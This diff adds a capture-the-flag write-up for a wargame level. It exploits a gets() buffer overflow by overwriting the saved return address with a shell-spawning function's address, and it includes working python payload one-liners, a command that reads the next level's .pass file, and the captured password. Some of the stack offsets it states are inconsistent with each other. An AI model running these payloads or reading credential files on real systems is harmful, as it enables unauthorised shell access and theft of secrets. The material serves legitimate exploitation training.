@@ -1,0 +1,15 @@
+In the main function, the program calls gets. This is a dangerous call because we can exploit a buffer overflow.
+Here's how the stack is organized before the call of gets:
+- $esp + 0x10-0x49 -> buffer[0x40]
+- $esp + 0x50-0x57 -> padding
+- $esp + 0x58-0x6b -> old $ebp
+- $esp + 0x6c-0x6f -> old $eip
+So we inject 0x4c characters inside the buffer and if we inject 4 mores characters, we can override the old $eip. We have the "run" function at 0x08048444 which execute a shell. We can replace old $eip by this adresss:
+./level1 <<< `python -c 'print ("a" * 0x4c + "\x44\x84\x04\x08")'`
+The program starts the shell but stdin is directly closed and we can't interact with it. We can keep it open by using cat and '-' argument piped:
+
+cat <(python -c 'print ("a" * 0x4c + "\x44\x84\x04\x08")') - | ./level1
+
+We have a shell open with level2 permissions !
+
+cat /home/user/level2/.pass : "53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77".
